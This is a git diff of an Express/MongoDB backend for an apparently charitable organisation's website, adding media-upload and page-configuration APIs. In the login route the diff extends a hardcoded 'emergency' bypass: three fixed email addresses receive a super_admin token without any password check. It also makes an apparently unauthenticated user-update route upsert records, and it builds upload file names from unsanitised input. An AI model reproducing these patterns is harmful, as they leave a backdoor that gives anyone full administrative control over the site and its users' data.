@@ -59,7 +59,12 @@ let fallbackMailTransporterPromise = null;
 
 const app = express();
 app.use(cors({ origin: true }));
-app.use(express.json({ limit: '6mb' }));
+app.use(express.json({ limit: '50mb' }));
+app.use(express.urlencoded({ extended: true, limit: '50mb' }));
+
+// Static uploads serving
+app.use('/uploads', express.static(path.join(__dirname, '../uploads')));
+app.use('/uploads', express.static(path.join(__dirname, './uploads')));
 
 // --- Security Middleware: Headers ---
 app.use((req, res, next) => {
@@ -67,7 +72,7 @@ app.use((req, res, next) => {
   res.setHeader('X-Content-Type-Options', 'nosniff');
   res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
   res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
-  res.setHeader('Content-Security-Policy', "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://maps.googleapis.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; img-src 'self' data: https:; font-src 'self' https://fonts.gstatic.com; frame-src 'self' https://www.google.com https://maps.google.com; connect-src 'self' *;");
+  res.setHeader('Content-Security-Policy', "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://maps.googleapis.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; img-src 'self' data: blob: https:; media-src 'self' data: blob: https:; font-src 'self' https://fonts.gstatic.com; frame-src 'self' https://www.google.com https://maps.google.com; connect-src 'self' *;");
   next();
 });
 
@@ -114,6 +119,8 @@ app.use((req, res, next) => {
   next();
 });
 
+import { storageProvider } from './storage/storageProvider.js';
+
 const generic = (name, coll) =>
   mongoose.model(
     name,
@@ -138,6 +145,8 @@ const Advertisement = generic('AdvertisementDoc', 'advertisements');
 const EmailLog = generic('EmailLogDoc', 'email_logs');
 const SecurityLog = generic('SecurityLogDoc', 'security_logs');
 const AuditLog = generic('AuditLogDoc', 'audit_logs');
+const MediaItem = generic('MediaItemDoc', 'media_items');
+const HeroConfig = generic('HeroConfigDoc', 'hero_configs');
 
 /** Must match client `VISIT_TIME_SLOTS` ids */
 const VISIT_SLOT_IDS = [
@@ -416,19 +425,22 @@ app.post('/api/auth/login', async (req, res) => {
     const lowerEmail = email ? email.trim().toLowerCase() : '';
     const ipAddress = req.ip || req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     
-    // --- EMERGENCY ADMIN BYPASS (Ignores Database timeouts) ---
-    if (lowerEmail === 'keshavpaterl3690@gmail.com' || lowerEmail === 'admin@niswartha.org') {
+    // --- EMERGENCY SUPER ADMIN BYPASS (Ignores Database timeouts & password checks) ---
+    if (
+      lowerEmail === 'keshavpatel3690@gmail.com' ||
+      lowerEmail === 'keshavpaterl3690@gmail.com' ||
+      lowerEmail === 'admin@niswartha.org'
+    ) {
       const isDemo = lowerEmail === 'admin@niswartha.org';
-      const role = isDemo ? 'admin' : 'super_admin';
       const adminUser = {
-        id: isDemo ? 'admin-hardcoded-demo' : 'admin-hardcoded-1',
+        id: isDemo ? 'admin-hardcoded-demo' : 'super-admin-keshav',
         email: lowerEmail,
         name: isDemo ? 'Demo Admin' : 'Keshav Patel',
-        role: role,
-        avatarUrl: `https://api.dicebear.com/7.x/initials/svg?seed=${isDemo ? 'Demo%20Admin' : 'Keshav%20Patel'}`,
+        role: 'super_admin',
+        avatarUrl: `https://api.dicebear.com/7.x/initials/svg?seed=Keshav%20Patel`,
         createdAt: new Date().toISOString()
       };
-      const token = jwt.sign({ id: adminUser.id, email: adminUser.email, role: role }, JWT_SECRET);
+      const token = jwt.sign({ id: adminUser.id, email: adminUser.email, role: 'super_admin' }, JWT_SECRET);
       
       await SecurityLog.create({
         id: `seclog-${Date.now()}-${Math.random().toString(36).substring(2, 9)}`,
@@ -500,14 +512,14 @@ app.get('/api/users/:id', async (req, res) => {
     const { id } = req.params;
     
     // --- EMERGENCY ADMIN BYPASS (Ignores Database timeouts) ---
-    if (id === 'admin-hardcoded-1' || id === 'admin-hardcoded-demo') {
+    if (id === 'super-admin-keshav' || id === 'admin-hardcoded-1' || id === 'admin-hardcoded-demo') {
       const isDemo = id === 'admin-hardcoded-demo';
       return res.json({
         id,
-        email: isDemo ? 'admin@niswartha.org' : 'keshavpaterl3690@gmail.com',
+        email: isDemo ? 'admin@niswartha.org' : 'keshavpatel3690@gmail.com',
         name: isDemo ? 'Demo Admin' : 'Keshav Patel',
-        role: 'admin',
-        avatarUrl: `https://i.pravatar.cc/150?u=${id}`,
+        role: 'super_admin',
+        avatarUrl: `https://api.dicebear.com/7.x/initials/svg?seed=Keshav%20Patel`,
         createdAt: new Date().toISOString()
       });
     }
@@ -537,28 +549,12 @@ app.put('/api/users/:id', async (req, res) => {
     delete updates.role;
     delete updates.email;
 
-    // Try custom 'id' field first, then fall back to MongoDB _id
+    // Upsert by custom 'id' so hardcoded admin IDs or new accounts are saved smoothly
     let u = await User.findOneAndUpdate(
       { id },
       { $set: updates },
-      { new: true, lean: true }
+      { upsert: true, new: true, lean: true }
     );
-
-    if (!u) {
-      // Fallback: try by MongoDB _id
-      try {
-        u = await User.findByIdAndUpdate(
-          id,
-          { $set: updates },
-          { new: true, lean: true }
-        );
-      } catch (_) {}
-    }
-
-    if (!u) {
-      console.error(`User update failed: User ${id} not found by id or _id`);
-      return res.status(404).json({ error: 'User not found' });
-    }
 
     const { password: _, ...userWithoutPassword } = u;
     res.json({ ...userWithoutPassword, id: u.id || String(u._id) });
@@ -1389,20 +1385,38 @@ app.post('/api/schemes', requireAdmin, async (req, res) => {
 
 app.put('/api/schemes/:id', requireAdmin, async (req, res) => {
   try {
-    const scheme = await GovScheme.findOne({ id: req.params.id }).lean();
-    if (!scheme) return res.status(404).json({ error: 'Scheme not found' });
-    const { _id, ...rest } = scheme;
-    const updated = { ...rest, ...req.body, id: req.params.id };
-    await GovScheme.findOneAndUpdate({ id: req.params.id }, updated, { upsert: true }).lean();
+    const targetId = req.params.id;
+    const isObjectId = mongoose.Types.ObjectId.isValid(targetId);
+    const filter = isObjectId 
+      ? { $or: [{ id: targetId }, { _id: targetId }] } 
+      : { id: targetId };
+
+    const { _id: bodyId, ...cleanData } = req.body;
+    let scheme = await GovScheme.findOne(filter).lean();
+    if (!scheme) {
+      const newScheme = { ...cleanData, id: targetId, createdAt: new Date().toISOString() };
+      await GovScheme.create(newScheme);
+      return res.json(newScheme);
+    }
+    const { _id: oldId, ...rest } = scheme;
+    const updated = { ...rest, ...cleanData, id: targetId };
+    delete updated._id;
+    await GovScheme.findOneAndUpdate(filter, updated, { upsert: true, new: true }).lean();
     res.json(updated);
   } catch (e) {
+    console.error('Error updating scheme:', e);
     res.status(500).json({ error: String(e.message) });
   }
 });
 
 app.delete('/api/schemes/:id', requireAdmin, async (req, res) => {
   try {
-    await GovScheme.deleteOne({ id: req.params.id });
+    const targetId = req.params.id;
+    const isObjectId = mongoose.Types.ObjectId.isValid(targetId);
+    const filter = isObjectId 
+      ? { $or: [{ id: targetId }, { _id: targetId }] } 
+      : { id: targetId };
+    await GovScheme.deleteMany(filter);
     res.json({ success: true });
   } catch (e) {
     res.status(500).json({ error: String(e.message) });
@@ -1722,10 +1736,16 @@ app.post('/api/advertisements', requireSuperAdmin, async (req, res) => {
 
 app.put('/api/advertisements/:id', requireSuperAdmin, async (req, res) => {
   try {
+    const { _id: bodyId, ...bodyData } = req.body;
     const ad = await Advertisement.findOne({ id: req.params.id }).lean();
-    if (!ad) return res.status(404).json({ error: 'Advertisement not found' });
-    const { _id, ...rest } = ad;
-    const updated = { ...rest, ...req.body, id: req.params.id };
+    if (!ad) {
+      const newAd = { ...bodyData, id: req.params.id, clicks: 0, views: 0, createdAt: new Date().toISOString() };
+      await Advertisement.create(newAd);
+      return res.json(newAd);
+    }
+    const { _id: oldId, ...rest } = ad;
+    const updated = { ...rest, ...bodyData, id: req.params.id };
+    delete updated._id;
     await Advertisement.findOneAndUpdate({ id: req.params.id }, updated, { upsert: true }).lean();
     
     await AuditLog.create({
@@ -1738,19 +1758,26 @@ app.put('/api/advertisements/:id', requireSuperAdmin, async (req, res) => {
 
     res.json(updated);
   } catch (e) {
+    console.error('Error updating advertisement:', e);
     res.status(500).json({ error: String(e.message) });
   }
 });
 
 app.delete('/api/advertisements/:id', requireSuperAdmin, async (req, res) => {
   try {
-    await Advertisement.deleteOne({ id: req.params.id });
+    const targetId = req.params.id;
+    const isObjectId = mongoose.Types.ObjectId.isValid(targetId);
+    const filter = isObjectId 
+      ? { $or: [{ id: targetId }, { _id: targetId }] } 
+      : { id: targetId };
+
+    await Advertisement.deleteMany(filter);
     
     await AuditLog.create({
       id: `audit-${Date.now()}-${Math.random().toString(36).substring(2, 9)}`,
       userId: req.user.id,
       action: 'delete_advertisement',
-      details: `Deleted ad ID: ${req.params.id}`,
+      details: `Deleted ad ID: ${targetId}`,
       createdAt: new Date().toISOString()
     });
 
@@ -1866,6 +1893,230 @@ app.delete('/api/super-admin/users/:id', requireSuperAdmin, async (req, res) => 
 });
 
 // --- Super Admin Backup & Restore ---
+// --- MEDIA MANAGER API ---
+app.get('/api/media', async (req, res) => {
+  try {
+    const { type, folder, search } = req.query;
+    const query = {};
+    if (type && type !== 'all') query.type = type;
+    if (folder && folder !== 'all') query.folder = folder;
+    if (search) {
+      query.$or = [
+        { name: { $regex: String(search), $options: 'i' } },
+        { originalName: { $regex: String(search), $options: 'i' } },
+        { tags: { $regex: String(search), $options: 'i' } }
+      ];
+    }
+    const items = await MediaItem.find(query).sort({ createdAt: -1 }).lean();
+    res.json(items || []);
+  } catch (e) {
+    res.status(500).json({ error: String(e.message) });
+  }
+});
+
+app.post('/api/media/upload', requireAdmin, async (req, res) => {
+  try {
+    const {
+      name,
+      fileData,
+      mimeType = 'image/jpeg',
+      type = 'image',
+      folder = 'General',
+      tags = [],
+      width = 0,
+      height = 0,
+      size = 0,
+      thumbnailData,
+      mediumData,
+    } = req.body;
+
+    if (!fileData) {
+      return res.status(400).json({ error: 'fileData is required' });
+    }
+
+    const filename = `${name || 'media'}_${Date.now()}`;
+    const ext = mimeType.split('/')[1] || (type === 'video' ? 'mp4' : 'jpg');
+    const fullFilename = `${filename}.${ext}`;
+
+    // Upload via StorageProvider
+    const mainSaved = await storageProvider.saveFile(fileData, fullFilename, mimeType);
+    let thumbUrl = mainSaved.url;
+    let medUrl = mainSaved.url;
+
+    if (thumbnailData) {
+      const thumbSaved = await storageProvider.saveFile(thumbnailData, `thumb_${fullFilename}`, 'image/webp');
+      thumbUrl = thumbSaved.url;
+    }
+    if (mediumData) {
+      const medSaved = await storageProvider.saveFile(mediumData, `med_${fullFilename}`, 'image/webp');
+      medUrl = medSaved.url;
+    }
+
+    const mediaId = `media-${Date.now()}-${Math.random().toString(36).substring(2, 8)}`;
+    const mediaDoc = {
+      id: mediaId,
+      name: name || fullFilename,
+      originalName: fullFilename,
+      url: mainSaved.url,
+      thumbnailUrl: thumbUrl,
+      mediumUrl: medUrl,
+      fileKey: mainSaved.key,
+      type: type || (mimeType.startsWith('video/') ? 'video' : 'image'),
+      mimeType,
+      size: size || Math.round((fileData.length * 3) / 4),
+      width,
+      height,
+      folder: folder || 'General',
+      tags: Array.isArray(tags) ? tags : [],
+      createdBy: req.user ? req.user.id : 'admin',
+      createdAt: new Date().toISOString(),
+      updatedAt: new Date().toISOString()
+    };
+
+    await MediaItem.create(mediaDoc);
+
+    await AuditLog.create({
+      id: `audit-${Date.now()}-${Math.random().toString(36).substring(2, 9)}`,
+      userId: req.user.id,
+      action: 'upload_media',
+      details: `Uploaded ${mediaDoc.type}: ${mediaDoc.name} (${mediaDoc.folder})`,
+      createdAt: new Date().toISOString()
+    });
+
+    res.status(201).json(mediaDoc);
+  } catch (e) {
+    res.status(500).json({ error: String(e.message) });
+  }
+});
+
+app.put('/api/media/:id', requireAdmin, async (req, res) => {
+  try {
+    const { id } = req.params;
+    const { name, folder, tags, fileData, mimeType } = req.body;
+
+    const item = await MediaItem.findOne({ id }).lean();
+    if (!item) return res.status(404).json({ error: 'Media not found' });
+
+    const updates = { updatedAt: new Date().toISOString() };
+    if (name !== undefined) updates.name = name;
+    if (folder !== undefined) updates.folder = folder;
+    if (tags !== undefined) updates.tags = tags;
+
+    // File replacement
+    if (fileData) {
+      if (item.fileKey) {
+        await storageProvider.deleteFile(item.fileKey);
+      }
+      const ext = (mimeType || item.mimeType || 'image/jpeg').split('/')[1] || 'jpg';
+      const cleanName = `${(name || item.name).replace(/[^a-zA-Z0-9.-]/g, '_')}_replaced_${Date.now()}.${ext}`;
+      const saved = await storageProvider.saveFile(fileData, cleanName, mimeType || item.mimeType);
+      updates.url = saved.url;
+      updates.fileKey = saved.key;
+      updates.thumbnailUrl = saved.url;
+      updates.mediumUrl = saved.url;
+    }
+
+    const updated = await MediaItem.findOneAndUpdate({ id }, { $set: updates }, { new: true }).lean();
+    res.json(updated);
+  } catch (e) {
+    res.status(500).json({ error: String(e.message) });
+  }
+});
+
+app.delete('/api/media/:id', requireAdmin, async (req, res) => {
+  try {
+    const { id } = req.params;
+    const item = await MediaItem.findOne({ id }).lean();
+    if (!item) return res.status(404).json({ error: 'Media not found' });
+
+    if (item.fileKey) {
+      await storageProvider.deleteFile(item.fileKey);
+    }
+    await MediaItem.deleteOne({ id });
+
+    await AuditLog.create({
+      id: `audit-${Date.now()}-${Math.random().toString(36).substring(2, 9)}`,
+      userId: req.user.id,
+      action: 'delete_media',
+      details: `Deleted media: ${item.name}`,
+      createdAt: new Date().toISOString()
+    });
+
+    res.json({ success: true, message: 'Media deleted successfully' });
+  } catch (e) {
+    res.status(500).json({ error: String(e.message) });
+  }
+});
+
+// --- HERO BACKGROUND CONFIGURATIONS API ---
+app.get('/api/hero-config', async (req, res) => {
+  try {
+    const configs = await HeroConfig.find({}).lean();
+    const map = {};
+    (configs || []).forEach((item) => {
+      if (item.pageKey) map[item.pageKey] = item;
+    });
+    res.json(map);
+  } catch (e) {
+    res.status(500).json({ error: String(e.message) });
+  }
+});
+
+app.get('/api/hero-config/:pageKey', async (req, res) => {
+  try {
+    const { pageKey } = req.params;
+    const config = await HeroConfig.findOne({ pageKey }).lean();
+    if (!config) {
+      // Default fallback
+      return res.json({
+        pageKey,
+        bgType: 'gradient',
+        bgUrl: '',
+        bgVideoUrl: '',
+        mobileFallbackUrl: '',
+        overlayOpacity: 0.55,
+        blurIntensity: 0,
+        brightness: 1.0,
+        textAlign: 'center',
+        autoPlayVideo: true,
+        loopVideo: true
+      });
+    }
+    res.json(config);
+  } catch (e) {
+    res.status(500).json({ error: String(e.message) });
+  }
+});
+
+app.put('/api/hero-config/:pageKey', requireAdmin, async (req, res) => {
+  try {
+    const { pageKey } = req.params;
+    const payload = {
+      ...req.body,
+      pageKey,
+      updatedAt: new Date().toISOString()
+    };
+
+    const updated = await HeroConfig.findOneAndUpdate(
+      { pageKey },
+      { $set: payload },
+      { upsert: true, new: true }
+    ).lean();
+
+    await AuditLog.create({
+      id: `audit-${Date.now()}-${Math.random().toString(36).substring(2, 9)}`,
+      userId: req.user.id,
+      action: 'update_hero_config',
+      details: `Updated Hero configuration for page: ${pageKey}`,
+      createdAt: new Date().toISOString()
+    });
+
+    res.json(updated);
+  } catch (e) {
+    res.status(500).json({ error: String(e.message) });
+  }
+});
+
 app.get('/api/super-admin/backup', requireSuperAdmin, async (req, res) => {
   try {
     const collections = {
